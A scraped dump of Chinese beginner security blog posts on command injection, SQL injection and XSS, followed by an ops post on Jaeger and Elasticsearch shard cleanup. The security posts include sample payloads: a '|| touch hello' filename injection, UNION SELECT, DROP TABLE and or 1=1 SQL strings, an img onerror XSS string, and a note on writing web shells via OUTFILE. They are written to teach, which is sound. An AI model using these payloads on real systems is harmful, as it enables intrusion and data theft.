的经典组合，文件名解析漏洞也没补，但上传的文件根本没放服务器上也不行（emm，没依据，不过要是能执行别的服务器上的代码的话就是远程代码执行的大洞了吧）。\n所以要利用的话，应该要求是：\n 用了 CGI 这样的协议，传上去的东西有机会被执行。 用了动态特性比较强的语言，从 php、python 到 java 都有运行时加载代码的能力。php 不多说，即使静态编译的语言如Java，也有像近期闹得比较大的 Log4J 漏洞，就是利用了运行时加载新代码的能力。更进一步如 Go、C/C++ 运行时加载代码就要靠共享库dlopen之类的方法了，用得不多雷也不多。PS: LD_PRELOAD这里认为不是 运行时 加载代码的方法。 有其他被执行的机会，比如能写到 cron.d 这样的位置，或者有其他可以结合利用的洞，比如有机会控制命令执行时的环境变量，加上任意文件上传，也能利用LD_PRELOAD之类的方式把上传的 payload 跑起来。  总的来说，未经检查和约束的文件上传接口总是危险的。现在没爆雷，将来某天也可能会爆。\n远程代码执行 命令执行 也好理解，和 SQL 注入是比较类似的。如果服务端有这样的代码system(\u0026quot;ffmpeg -i /tmp/\u0026quot; + $_REQUEST[\u0026quot;filename\u0026quot;])，那控制了filename就能让system去执行任意命令。\n比如传一个 filename=|| touch hello，整条命令就变成了 ffmpeg -i /tmp/|| touch hello，|| 或运算连接前后两条命令都会被执行。有Linux环境可以自己试试false||id看看id命令会不会跑起来。\n代码执行 代码执行是个很宽泛的概念，因为可以执行的东西太多了。\n从最最最底层的，利用栈溢出漏洞覆盖返回地址，让进程执行自己期望的代码，到很上层的，利用eval这样的函数（在php、nodejs、python环境里都有）执行远程代码。\n还有如dlopen、java的动态类加载等等，解释执行的语言还可以include或import、require新的代码，等等这些函数的参数如果被用户输入控制的话都会构成远程代码执行的危险。\n总结 其实没什么好总结的，都是些概念性的东西，没有干货。\n","date":"2022-04-20T15:59:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-cyber-security-upload-and-remote-command-execution-vulnerability/","title":"安全入门系列-上传漏洞和远程命令执行"},{"content":"前言 记得很早以前玩过SQL注入，还在上中学吧好像，拿学校的官网玩。\nSQL注入是个很老的漏洞了，准确说是开发人员水平太差、相关的库和最佳实践还没传播开的那段时期常出现的 编程错误 。\n原理 所谓SQL注入就是用户的输入在服务端组织成SQL的时候未经适当地过滤，结果用户输入扭曲了服务端构造的SQL原意，造成错误。\n比较常见的一种问题就是直接把用户输入拼接到了SQL字符串里。\n1 2 3  func handler(w http.ResponseWriter, req *http.Request) { row := db.QueryRow(fmt.Sprintf(\u0026#34;SELECT id FROM user WHERE nickname=\u0026#39;%s\u0026#39;\u0026#34;, req.URL.Query()[\u0026#34;nickname\u0026#34;])) }   像是上述的代码，如果用户请求 localhost/user?nickname=weakptr，拼接的SQL结果就是SELECT id FROM user WHERE nickname='weakptr'，符合预期。但如果用户请求的是localhost/user?nickname=' UNION SELECT password FROM user WHERE nickname='admin' --，拼接的SQL就会变成 SELECT id FROM user WHERE nickname='' UNION SELECT password FROM user WHERE nickname='admin' --，也就是会查出 admin 用户的 password 字段。\n当然这样的注入并不总是能成功，像是上面我用 go 写的 QueryRow，在 Scan 的时候传入的变量数量和类型会和被注入的 SQL 不匹配，返回错误。不过这不代表用 Go 就安全了，因为用户完全可以传个 ' DROP TABLE user 删除整个表，或者拼一个 ' or 1=1 让条件恒真，跳过身份认证。\n对这种问题最好的解决办法就是不要把用户输入直接拼到SQL里，而是用 ? 占位符。\n https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html\nUsing prepared statements with placeholders for parameter values has the following benefits:\n Less overhead for parsing the statement each time it is executed. Typically, database applications process large volumes of almost-identical statements, with only changes to literal or variable values in clauses such as WHERE for queries and deletes, SET for updates, and VALUES for inserts. Protection against SQL injection attacks. The parameter values can contain unescaped SQL quote and delimiter characters.   这个特性叫 server-side prepared statement，在 MySQL 4.1 就引入了。对更古早一些的开发者来说，想写出现安全的服务端代码确实是没有现如今这么轻松的，还得自己关注SQL拼接和转义。而如今像 Go 这样的语言直接把 prepared statement 写进标准库，当成最佳实践，想写出 bug 都不容易。\n好了回到正题。\n其实硬要说起来 SQL 注入如今也不是完全被杜绝了，因为拼 SQL 始终还是有需求的，对自己代码质量有追求的程序猿还是少数。像是 SELECT ... FROM tbl WHERE ... IN (a,b,c,d,e,f)，IN 如果要用 prepared statement 写就至少要维护一个参数列表和 string builder，但如果像是 python 一类语言，就能偷懒成 cond.map(lambda s: f\u0026quot;'{s}'\u0026quot;).join(',')，省掉一个参数列表和循环，埋下漏洞。\n漏洞分类 字符型注入 简而言之，提交的输入类型是字符串的时候（比如nickname、address这样的字段），如果存在上面说的漏洞，那就是一个字符型注入漏洞。\n这里涉及的知识点是 提交的输入类型。对于弱类型语言来说服务端可能没限制前端表单提交的类型，表单是 input type=number 也接受，字符串也接受，服务端的 web 框架要么推导类型（罕见），要么用客户端的类型（当提交json一类数据的时候），要么全部当成 bytes、string，留给开发者自己处理。\n比较常规的情况是服务端拿到 request.form 是一个字典类型（总之就是dict或map这样的映射类型，不用抠字眼），值要么全是 string 要么根据一定条件解析成服务端的数据类型（int、float、array等）。\n如果服务端没有解析类型，直接往 SQL 里拼，大多时候就是字符型SQL注入；解析了，是个字符串，往 SQL 里拼，也是字符型注入。\n解析了，不是字符串，再格式化，那就很难控制服务端的SQL了。\n数字型注入 数字型注入就是放屁。\n本质依然是你提交的数据没有被服务端检查类型，不管是 int 还是 string 直接往 SQL 里拼。非要说和字符型注入的区别就是服务端怎么把自己觉得是数字的内容拼到 SQL 里：\n WHERE nickname='{nickname}' 拼字符串的时候为了不出现SQL语法错误，要加上 '' 单引号。 WHERE id={id} 拼数字的时候就不加。  但凡用 sprintf格式化个%d，或者拿什么请求验证框架对输入数据做了个类型检查就没数字型注入什么事儿了。\n注入点 query 就是出现在 URL Query Parameter 里的 SQL 注入点。比如 GET /user_profile?user_id=1，user_id=1没过滤，那注入点就在这里。\npost 出现在 post 表单里的注入点，content-type 是 x-www-form-urlencoded 还是 multipart/form-data，亦或者 application/json 都无关紧要。\n只要服务端的代码无脑往 SQL 里拼用户输入，那就是注入漏洞。\nheader 出现在 HTTP Header 里的注入点，比如在 Cookies 的什么数据，或者自定义的 HTTP 头字段。牢记 SQL 注入漏洞的本质是服务端拿了这些数据无脑往SQL里拼。\n攻击手法 报错法 首先从攻击者的视角看肯定是不知道服务器上数据表怎么设计的，所以一上手就直接传个 ' UNION SELECT 查出管理员账号密码是不太现实的。\n当通过传 ' or 1=1 或类似的 payload 确认可能存在 SQL 注入点之后，攻击者可以故意制造一些 SQL 错误，看看服务端有没有直接把错误页返回到浏览器。\n如果服务端没有做好 500 页面处理，直接把面向开发者的错误信息返回给了攻击者，攻击者就能借此获得服务端的信息：比如服务端使用的编程语言、框架、数据库版本、表名等等。如果错误页再人性化一点，比如类型错误顺便打印出变量内容，直接把数据爆出来也有可能。\n没管好 500 页导致错误爆到前端，这种问题也可能造成 SQL 注入以外的漏洞但不是这篇博客想讨论的内容了。\n总之报错法攻击就是根据返回的错误信息调整注入的payload，最终构造合法的 SQL 查出攻击者想要的数据。\n盲注 对于没有 500 页（注入非法SQL不报错）或者只有一个通用的 500 页（不返回具体错误），此时只能盲注。先确定注入的 SQL 会如何影响页面，比如提交合法 payload 时的页面和提交非法 payload 时的页面有何不同。相当于我们有了一个 bit 的观测窗口。\n接着只要构造一个合法的 SQL ，比如 ' AND username=admin 等（例子不好，控制了 SQL其实能干的事情太多了）就能一个字符一个字符爆破出用户名和密码（前提是密码没加盐哈希）。\n读写文件 比如服务器运行的是MySQL而且权限配置有问题（比如跑在 root），那就可能直接注入一条 LOAD_FILE/OUT_FILE 之类的函数，写入 Web Shell 或者读到 /etc/shadow 之类的敏感文件。\n工具  sqlmap  只知道这一个。\n总结 现在 SQL 注入的漏洞应该不多了，大概还有些被玩烂了的旧网站依然有这种问题。按现在挖矿的疯狂程度来看，还有这种洞怕是迟早被淦，要么下线要么升级。\n现代的 web 程序这种问题应该不多了，有好用的 ORM 和各种查询工具还手拼 SQL 干啥呢。\n挖 ORM 或者那些查询库的洞就是另一码事了。\n","date":"2022-04-19T11:06:00+08:00","permalink":"https://nnnewb.github.io/blog/p/get-start-cyber-security-sql-inject/","title":"安全入门系列-sql注入"},{"content":"前言 要是开发拿不到更高薪，继续撞天花板，就打算转安全了。考虑5年开发，以及不止5年的各种学习，想转到安全应该不是太难的事。\n且不说转不转行，先了解下安全这行总没错。不转行懂点安全也算优势。\n 编辑于 2022年4月19日\n 考虑成体系学习，把标题改成了安全入门系列。差不多弄清楚 web 安全主流的攻防方向之后再整理个脑图什么的梳理下怎么深入。\nXSS 原理 XSS全称 Cross Site Scripting，X 就是 Cross（强行冷笑话）。本质是利用不正常的方式，在网页上插入一段可以执行的 JavaScript 代码，实现窃取 Cookie、冒充用户发送请求之类的操作。\n众所周知浏览器按 F12 在开发者工具里想怎么玩弄网页都行，XSS 听起来像是脱裤放屁。但开发者工具是有极限的，骗人打开开发者工具往里面贴自己看不懂的代码，和发个链接一打开就中招显然是两个难度的事情。\n分类 反射型 反射型 XSS 利用服务器或前端把请求中的字段渲染成 HTML 的行为来向网页注入 js。比如这样一个页面：\n1  \u0026lt;p\u0026gt; 你好，\u0026lt;?php echo $_GET[\u0026#34;name\u0026#34;]?\u0026gt;\u0026lt;/p\u0026gt;   页面元素的一部分未经过滤就直接渲染成了 HTML 的一部分，就会产生一个 XSS 漏洞，传递这样一个 name ： \u0026lt;img src=1 onerror=alert(1)/\u0026gt; 就能让网页按我们的想法弹窗了。\n之所以叫反射型，是因为注入的 JS 到了服务器又回到了前端，就像是镜子里反射出你自己的影子。\n持久型 和反射型差不多，不同的是注入的 JS 被持久化到了服务端，比如上面的用户名注入点是从数据库提取的，那么把用户名改成 \u0026lt;img src=1 onerror=alert(1)/\u0026gt;，每次访问这个页面都会触发脚本了，威胁比反射型 XSS 更大。\nDOM型 DOM 型和上面其他 XSS 的主要区别在于不经过服务器，像是现在大前端常见的 SPA ，路由都在前端，后端只有 API 不负责渲染网页。如果前端应用里出现 elem.innerHTML=userinput，userinput没好好过滤的情况，就是个 DOM 型的 XSS 漏洞。\n测试 代码审计 目前对代码审计的理解就是 review 源码来尝试发现漏洞，大概只对开源代码或前端代码有用。没代码的话审计就有点逆向的意思了。XSS 漏洞可以从审计中发现，比如 一次对 Tui Editor XSS 的挖掘与分析。\n手动测试 手工测试就是在可能的 XSS 注入点提交诸如 \u0026lt;img/onerror=alert(1)\u0026gt;一类的内容，观察提交的内容是怎么转义的，提交内容如何渲染，再尝试修改 payload 来绕过防护，直至成功或失败。\n自动测试 尚不清楚自动 XSS 测试的原理，工具有 XRay 。个人猜测至少两条路子：\n 对能访问源码的情况可以自动源码审计，找出危险的赋值或调用。 不能访问源码的情况下：  尝试判断底层框架，使用已知漏洞的 exploit 测试 根据一定的规则，在可能的表单提交点尝试一系列 payload    实际上我觉得更像是半自动的，比如不涉及源码的情况下至少应该需要配置下要尝试的注入点（以及如何检测注入是否成功的页面）和指定 payload 类型，不然注入点的表单都填不满。\n总结 我倒是想再加个实战环节，但现在找个足够简单的 XSS 还挺难的。vulhub 有个 drupal 的 XSS 虽然能跑，但单纯跑一下 PoC 着实没什么乐趣可言。重复一次别人做过的分析倒是可以，但有点超出写这篇博客时的计划了，于是暂时不管，走马观花为主，先对整个安全体系建立概念再由点带面入门。\n","date":"2022-04-18T10:11:00+08:00","permalink":"https://nnnewb.github.io/blog/p/xss-day-1/","title":"安全入门系列-xss"},{"content":"前言 jaeger 是一个比较常用的分布式追踪服务，后端可以选 es、cassandra 等存储，我司线上就是用了 es 作为 jaeger 存储。\njaeger 用 es 做查询后端的时候有个坏毛病：它会自动按日期分割日志 span，一天一个 index。直接结果就是一段时间没管线上的 jaeger，过一段时间就会发现 jaege 里啥也查不出来了。翻 jaeger 的日志就会看到下面的内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  { \u0026#34;level\u0026#34;: \u0026#34;error\u0026#34;, \u0026#34;ts\u0026#34;: 1649751249.9240348, \u0026#34;caller\u0026#34;: \u0026#34;config/config.go:141\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;Elasticsearch part of bulk request failed\u0026#34;, \u0026#34;map-key\u0026#34;: \u0026#34;index\u0026#34;, \u0026#34;response\u0026#34;: { \u0026#34;_index\u0026#34;: \u0026#34;jaeger-span-2022-04-12\u0026#34;, \u0026#34;_type\u0026#34;: \u0026#34;_doc\u0026#34;, \u0026#34;status\u0026#34;: 400, \u0026#34;error\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;illegal_argument_exception\u0026#34;, \u0026#34;reason\u0026#34;: \u0026#34;Validation Failed: 1: this action would add [10] total shards, but this cluster currently has [2998]/[3000] maximum shards open;\u0026#34; } }, \u0026#34;stacktrace\u0026#34;: \u0026#34;github.com/jaegertracing/jaeger/pkg/es/config.(*Configuration).NewClient.func2\\n\\tgithub.com/jaegertracing/jaeger/pkg/es/config/config.go:141\\ngithub.com/olivere/elastic.(*bulkWorker).commit\\n\\tgithub.com/olivere/elastic@v6.2.35+incompatible/bulk_processor.go:588\\ngithub.com/olivere/elastic.(*bulkWorker).work\\n\\tgithub.com/olivere/elastic@v6.2.35+incompatible/bulk_processor.go:501\u0026#34; }   此时检查 GET /_cat/shards 或 GET /_cat/allocation 都能看到分片数量达到了日志里记录的 2998 个。\n原因 jaeger产生大量分片 elasticsearch 官方文档指出，每个 index 会被切分成1或多个分片(shards)，每个分片都可能在节点间复制，以防硬件故障。\n Each index in Elasticsearch is divided into one or more shards, each of which may be replicated across multiple nodes to protect against hardware failures.\n 而据我观察（sorry，没有文档），jaeger 每天创建的 index 都包含至少 5 个 primary 分片，一个 replica 分片。可以通过请求index/_settings这个api端点来检查索引会分配的分片和冗余数量。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  HTTP/1.1 200 OK content-encoding: gzip content-length: 239 content-type: application/json; charset=UTF-8 { \u0026#34;jaeger-span-2022-04-12\u0026#34;: { \u0026#34;settings\u0026#34;: { \u0026#34;index\u0026#34;: { \u0026#34;creation_date\u0026#34;: \u0026#34;1649749148182\u0026#34;, \u0026#34;mapping\u0026#34;: { \u0026#34;nested_fields\u0026#34;: { \u0026#34;limit\u0026#34;: \u0026#34;50\u0026#34; } }, \u0026#34;number_of_replicas\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;number_of_shards\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;provided_name\u0026#34;: \u0026#34;jaeger-span-2022-04-12\u0026#34;, \u0026#34;requests\u0026#34;: { \u0026#34;cache\u0026#34;: { \u0026#34;enable\u0026#34;: \u0026#34;true\u0026#34; } }, \u0026#34;uuid\u0026#34;: \u0026#34;s2i5GZtpTzm3Kp4fIldwrQ\u0026#34;, \u0026#34;version\u0026#34;: { \u0026#34;created\u0026#34;: \u0026#34;7090199\u0026#34; } } } } }   而检查 GET /_cat/indices 可以发现，jaeger 创建的 index 包括 jaeger-service-yyyy-mm-dd 和 jaeger-span-yyyy-mm-dd 两种，很容易算出预期每月可能产生 336~372 个新的分片。\nes每个节点分片数量受限 关于节点分片数量限制，官方文档的说法是这样的：\n index.routing.allocation.total_shards_per_node\nThe maximum number of shards (replicas and primaries) that will be allocated to a single node. Defaults to unbounded.\n\u0026hellip;\ncluster.routing.allocation.total_shards_per_node\n(Dynamic) Maximum number of primary and replica shards allocated to each node. Defaults to -1 (unlimited).\n\u0026hellip;\n 也就是默认不限制，但显然我们遇到的情况不是这样，要是 shards 数量不限制的话就根本没现在的问题了。\n所以在东翻西找了一轮之后，我发现还有另一个设置项。这个设置项用 shards per node limits 当关键词搜索的时候没找到，在 GET /_cluster/settings?include_defaults 里翻出来了：max_shards_per_node。\n然后我在文档里搜了下，发现官方文档其实已经做了SEO，我要是直接把错误信息贴进谷歌搜的话说不定早发现这个配置项了\u0026hellip;\n this action would add [x] total shards, but this cluster currently has [y]/[z] maximum shards open;\nThe cluster.max_shards_per_node cluster setting limits the maximum number of open shards for a cluster. This error indicates an action would exceed this limit.\n max_shards_per_node的文档也很怪：\n cluster.max_shards_per_node\n(Dynamic) Limits the total number of primary and replica shards for the cluster. Elasticsearch calculates the limit as follows:\n1  cluster.max_shards_per_node * number of non-frozen data nodes   Shards for closed indices do not count toward this limit. Defaults to 1000. A cluster with no data nodes is unlimited.\n 虽然字面上看就是一个节点可以assign的分片数量，但实际算的是 total number of primary and replica shards for cluster。可以简单算一下，单节点集群显然只有一个 non-frozen data node，所以集群的分片上限就是 1000 * 1。线上的 3 节点集群没有 frozen data node，所以全集群最多有 1000*3 个分片。\n好了问题来了，max_shards_per_node 和 total_shards_per_node 有啥区别？\ntotal_shards_per_node 限制的是 一个节点能分配多少分片，max_shards_per_node 是 计算全集群能分配多少分片 。\n例如一个三节点集群里，total_shards_per_node 是 100，但 max_shards_per_node 是 1000，可以创建出超过100个分片，但超出的分片不会被分配（没有实验过，我猜是不会 assign）。\n反过来说 total_shards_per_node 比 max_shards_per_node 大的时候，虽然节点还能分配更多分片，但集群分片数已经到上限了，就会出现 this action would add [x] total shards, but this cluster currently has [y]/[z] maximum shards open; 错误了。\n处理 总的来说，既然是集群内的 max_shards_per_node 配置小了，解决方法就很多：\n 把 max_shards_per_node 调大，比如10000，直接10倍。 加 es 服务节点。 删旧的 jaeger 索引。  改配置显然是有点离谱的想法，等于是看到蟑螂在脚下，你选择铺张地毯，眼不见心不烦。\n加节点只适合不差钱的公司，而且这么选多少是有点看公司人傻钱多的意思。\n删除旧索引就正常很多，算是经典操作。更早些年应该还有个人站长写 crontab 自动删 /var/log 日志的，删旧索引本质差不多就是这个意思。\n而清理旧索引也有很多做法。\njaeger-es-rollover 初始化 注意，我无法确定是否对未启用--es.use-aliases时创建的索引有效。\n注意，rollover init 也会创建索引和分片，如果你已经碰到了上面的问题，直接 rollover init 会失败，必须先手动清理。\n如果只想看如何清理旧索引，请跳到 删除 部分，还不行就跳到 curator 小节。\nsearch indices 一节所述，可以使用 jaeger-es-rollover 解决以 es 作为后端存储时的 jaeger 日志轮转问题。我要吐槽下，原文：\n参考 jaeger 部署文档中 shards and replicas for elasticsearch indices 一节所述，可以使用 jaeger-es-rollover 解决以 es 作为后端存储时的 jaeger 日志轮转问题。我要吐槽下，原文：\n Shards and replicas are some configuration values to take special attention to, because this is decided upon index creation. This article goes into more information about choosing how many shards should be chosen for optimization.\n 没有任何未配置 es 日志轮转可能产生的问题的警告。我怎么知道take special attention to是指性能会在特定条件下拉胯，还是直接把 es 服务的 shards 占满，直接搞得 es 没法服务？This article 这个链接更离谱了，半句没提为什么后面有个 elasticsearch rollover 小结。\n好闲话少叙。我这里是 kubernetes 平台，docker-compose 用户或者真机部署的自己看着改。\n1  kubectl create job --image jaegertracing/jaeger-es-rollover:latest jaeger-es-rollover-init -- /go/bin/es-rollover init http://elasticsearch-es-http.elasticsearch.svc.cluster.local:9200 --es.username=***censored*** --es.password=***censored***   换成 docker 命令就是\n1  docker run -it --rm --net=host jaegertracing/jaeger-es-rollover:latest init http://localhost:9200 --es.username=***censored*** --es.password=***censored***   这一步会创建几个新的 index 和别名\n注意图中标记的部分。\n下一步修改 jaeger 的启动参数，我这里直接 kubectl edit -n jaeger deployment jaeger 编辑。\n应用后自动更新 pod，注意看下日志有没有错误或者警告。对于 docker-compose 用户改法差不多，如果 jaeger 是直接 docker run 起来的，那是真的牛啤。自己 docker rm 再 docker run 一次吧。真机部署 jaeger 还没见过直接略，无非是改 systemd 配置或者 /etc/init.d 。\n到这里 jaeger 部署的调整就完了，但问题还没解决：要是时间久了，会不会还创建一堆 indices？据我观察，应该不会再每天 2 个 index 的频率高强度创建 index 了（PS：因为第一天动手的时候没注意，jaeger 没加 --es.use-aliases=true，所以我也不敢说绝对不会，建议自己改了第二天看一眼。），新的 index 会写入到之前看到的 jaeger-span-000001 这种 index 里。\n文档里给了个从每日创建索引转到 rollover 的迁移方法：\n这不会删除旧索引，只是把旧索引合并到了别名jaeger-*-read里，让 jaeger 能查询到旧的日志。\n1 2 3  curl -ivX POST -H \u0026#34;Content-Type: application/json\u0026#34; localhost:9200/_aliases -d \u0026#39;{\u0026#34;actions\u0026#34; : [{ \u0026#34;add\u0026#34; : { \u0026#34;index\u0026#34; : \u0026#34;jaeger-span-*-*-*\u0026#34;, \u0026#34;alias\u0026#34; : \u0026#34;jaeger-span-read\u0026#34; } }, { \u0026#34;add\u0026#34; : { \u0026#34;index\u0026#34;:\u0026#34;jaeger-service-*-*-*\u0026#34;, \u0026#34;alias\u0026#34; : \u0026#34;jaeger-service-read\u0026#34; }}]}\u0026#39; # archive indices curl -ivX POST -H \u0026#34;Content-Type: application/json\u0026#34; localhost:9200/_aliases -d \u0026#39;{\u0026#34;actions\u0026#34; : [{ \u0026#34;add\u0026#34; : { \u0026#34;index\u0026#34; : \u0026#34;jaeger-span-archive\u0026#34;, \u0026#34;alias\u0026#34; : \u0026#34;jaeger-span-archive-read\u0026#34; } }]}\u0026#39;   注意如果有归档的话用 第二条 curl 的同时还要给 jaeger 加上启动参数--es.archive.use-aliases=true。\n轮转 到这里，问题解决了90%，但还有个问题：如果所有 jaeger 数据都放在一个 index 里，过上一段时间，数据量膨胀后会不会产生性能问题？这是很自然的想法，日志这种东西是很容易膨胀的，随时间流逝很可能堆成一座难以清理的大山：就像是你想在MySQL里往一个记录超亿级的表里插数据或删数据一样。\njaeger-es-rollover 真正的用途就是这个：轮转日志。一个 index 已经有 100M 了，那就换一个 index 吧。\n1 2  # 按 CONDITIONS 指定的规则轮转 docker run -it --rm --net=host -e CONDITIONS=\u0026#39;{\u0026#34;max_age\u0026#34;: \u0026#34;1s\u0026#34;}\u0026#39; jaegertracing/jaeger-es-rollover:latest rollover http://localhost:9200    Rollover lets you configure when to roll over to a new index based on one or more of the following criteria:\n max_age - the maximum age of the index. It uses time units: d, h, m. max_docs - the maximum documents in the index. max_size - the maximum estimated size of primary shards (since Elasticsearch 6.x). It uses byte size units tb, gb, mb.   目前支持的条件就只有这些。rollover 并不能让 es 替你 轮转索引，所以这个 rollover 命令只能自己定时执行。\n对于 docker-compose 用户或者 docker 用户我没啥好办法，也许你可以在宿主机里写一个 crontab 跑上面的docker run。\n对于我这样的 kubernetes 用户则可以选择用 kubernetes 的 cronjob 实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  apiVersion:batch/v1beta1# 对于 kubernetes v1.21.x 已经不是 beta 了，改成 batch/v1kind:CronJobmetadata:name:jaeger-es-index-rollovernamespace:jaegerspec:schedule:\u0026#34;0 0 * * 0\u0026#34;jobTemplate:spec:template:spec:containers:# see document https://www.jaegertracing.io/docs/1.32/deployment/#remove-old-data- image:jaegertracing/jaeger-es-rollover:latestname:jaeger-es-rolloverenv:- name:CONDITIONSvalue:\u0026#39;{\u0026#34;max_age\u0026#34;:\u0026#34;2d\u0026#34;}\u0026#39;args:- rollover- --es.username=***censored***- --es.password=***censored***- \u0026#34;http://elasticsearch-es-http.elasticsearch.svc.cluster.local:9200\u0026#34;resources:requests:cpu:100mmemory:100Milimits:cpu:100mmemory:100MirestartPolicy:Never  好，问题解决99%了！\n删除 最后就是删除不再需要的数据了，很简单啦。下面的命令中 14 表示保留最近14天的日志，同样支持 --es.username和--es.password参数。\n1  docker run -it --rm --net=host -e ROLLOVER=true jaegertracing/jaeger-es-index-cleaner:latest 14 http://localhost:9200   注意，虽然文档说 that is also used for daily indices，但实际发现好像并不会删。\n我不确定是不是 ROLLOVER 这个环境变量的影响，建议自己试试。\nelasticsearch-curator 好了，奇技淫巧环节。curator 是一个 elastic 公司开源的 python 包，介绍比较皮：\n Have indices in Elasticsearch? This is the tool for you!\nLike a museum curator manages the exhibits and collections on display, Elasticsearch Curator helps you curate, or manage your indices.\n 对不起，没去过博物馆，也没做过馆长，Get 不到。\n简单地说，curator 是一个 indice 管理的工具，我们用这个工具实现找到旧索引并删除。\ncurator 的命令行界面像这样：\n1 2 3 4 5 6 7 8 9 10 11  Usage: curator [OPTIONS] ACTION_FILE Curator for Elasticsearch indices. See http://elastic.co/guide/en/elasticsearch/client/curator/current Options: --config PATH Path to configuration file. Default: ~/.curator/curator.yml --dry-run Do not perform any changes. --version Show the version and exit. --help Show this message and exit.   关于这个工具，我们主要关注官方文档里的两个部分：configuration file 和 action file。\nconfiguration file 保存的是关于连接 es 所需的配置如地址、用户名密码、验证方法等，以及工具本身的配置如日志。\naction file 保存的是我们希望 curator 帮我们完成的操作。\naction file 的格式如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13  actions:1:action:ACTION1description:OPTIONAL DESCRIPTIONoptions:option1:value1...filters:- filtertype:*first*filter_element1:value1...2:...  其中 action 是我们希望 curator 做的事，options 和 filters 控制 action 的行为和行为的对象。action支持很多不同的操作。\n好了，现在看实例。我们想删除名称符合 jaeger-span-yyyy-mm-dd 格式的 index，并且yyyy-mm-dd小于指定的日期。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  actions:1:action:delete_indicesdescription:\u0026gt;-delete old jaeger-span indicesoptions:ignore_empty_list:Truetimeout_override:continue_if_exception:Truedisable_action:Falsefilters:- filtertype:patternkind:prefixvalue:jaeger-spanexclude:- filtertype:agesource:namedirection:oldertimestring:\u0026#39;%Y-%m-%d\u0026#39;unit:daysunit_count:7exclude:  动作：delete_indices；忽略空输入，即使异常也继续执行；要删除的对象以 jaeger-span 开头，并且名称包含 %Y-%m-%d 模式的日期，且早于 7 天前。\ndone！把上面的配置复制一份套用到 jaeger-service-yyyy-mm-dd 上，删除 jaeger-span 的任务就算配置好了。\n接下来把删除工作配置成定时任务，这里还是用了 cronjob。\n先把配置保存成 ConfigMap。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  ---# https://kubernetes.io/docs/concepts/configuration/configmap/kind:ConfigMapapiVersion:v1metadata:name:curator-confignamespace:jaegerdata:curator.yml:|client: hosts: - **** - **** - **** port: 9200 username: ***censored*** password: ***censored*** logging: loglevel: INFO logformat: defaultaction.yml:|actions: 1: action: delete_indices description: \u0026gt;- delete old jaeger-span indices options: ignore_empty_list: True timeout_override: continue_if_exception: True disable_action: False filters: - filtertype: pattern kind: prefix value: jaeger-span exclude: - filtertype: age source: name direction: older timestring: \u0026#39;%Y-%m-%d\u0026#39; unit: days unit_count: 7 exclude: 2: action: delete_indices description: \u0026gt;- delete old jaeger-service indices options: ignore_empty_list: True timeout_override: continue_if_exception: True disable_action: False filters: - filtertype: pattern kind: prefix value: jaeger-service exclude: - filtertype: age source: name direction: older timestring: \u0026#39;%Y-%m-%d\u0026#39; unit: days unit_count: 7 exclude:  再编写一个 CronJob\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  apiVersion:batch/v1beta1kind:CronJobmetadata:name:jaeger-es-index-cleanupnamespace:jaegerspec:schedule:\u0026#34;0 0 * * 0\u0026#34;jobTemplate:spec:template:spec:volumes:- name:curator-configconfigMap:name:curator-configcontainers:- image:bitnami/elasticsearch-curator:5.8.4name:elasticsearch-curatorcommand:- sh- -c- curator --config /cfg/curator.yml /cfg/action.ymlvolumeMounts:- mountPath:/cfgname:curator-configresources:requests:cpu:100mmemory:100Milimits:cpu:100mmemory:100MirestartPolicy:Never  这里用了 bitnami/elasticsearch-curator 镜像，如果不信任的话可以自己写个 Dockerfile 也不会很麻烦。我主要看中 bitnami 镜像大小优化还不错（98M），要是我自己随便写一个的话可能就不止这么大了。看了眼镜像的 Dockerfile 没有什么可疑的地方就直接用啦。\n对于需要立刻跑一次的情况，可以把 jobTemplate 下面的内容复制出来单独写个 Job 先跑起来。\n手动 手动法我说个思路。首先你得有个 kibana console 可以访问，或者能直接请求到 es 的 9200 端口。\nGET /_cat/indices 拿到 indices 列表，按名字正则过滤 jaeger-(span|service)-\\d{4}-\\d{2}-\\d{2}，然后把后面的日期解析一下；或者粗暴点，直接^(2022-04-\\d{2})过滤出本月（4月）以外的所有索引，拿到一个索引列表。\n具体点说，像是 kibana console 拿到的是一个每行格式如 green open jaeger-span-2022-03-01 .... 这样的纯文本，你可以放到 vscode 里然后用 Filter Lines 这样的插件快速正则过滤出来，再按 alt+shift+方向键 多光标，快速编辑出一个索引名称列表。\n然后把索引名前面加上 DELETE /，产生 DELETE /jaeger-span-2022-03-01 这样的列表，贴到 kibana console 里，全选运行，done。\n要是没 kibana ，只有 9200 访问，就改成 curl 请求，或者 httpie ，反正总有办法。最后批量执行就好。\n要是都没有，讲道理啊你跟负责人说下要个访问权限好吧\u0026hellip;\u0026hellip;\n要是对自己的脚本编程能力有自信的话，大可直接写个 bash 脚本定时跑，也是 ok 的。\n总结 总之，jaeger-es-rollover 配 jaeger-es-index-cleaner；或者elasticsearch-curator都行。手动法无非是手工拿到 indices 然后用各种编辑器批量编辑技巧或者正则替换，拼出个脚本。正则表达式当真是每个开发者的必备良药。\n讲道理地说要不是 jaeger 给我整这一出我可能还想不到拿 es 当 jaeger 后端还会有这种坑。但这也算给我提了个醒，挂在 es 上的数据虽然不多而且都是从 MySQL 同步过去的，es 的一些基本配置如分片啥的还是得关注一下，不能只顾着接 api。这就是所谓的 运维压力 了吧。\n应该还有不少小公司的开发其实是缺乏能力运维诸如 es 这样的项目的，对 MySQL 也是仅限于精通 安装和使用 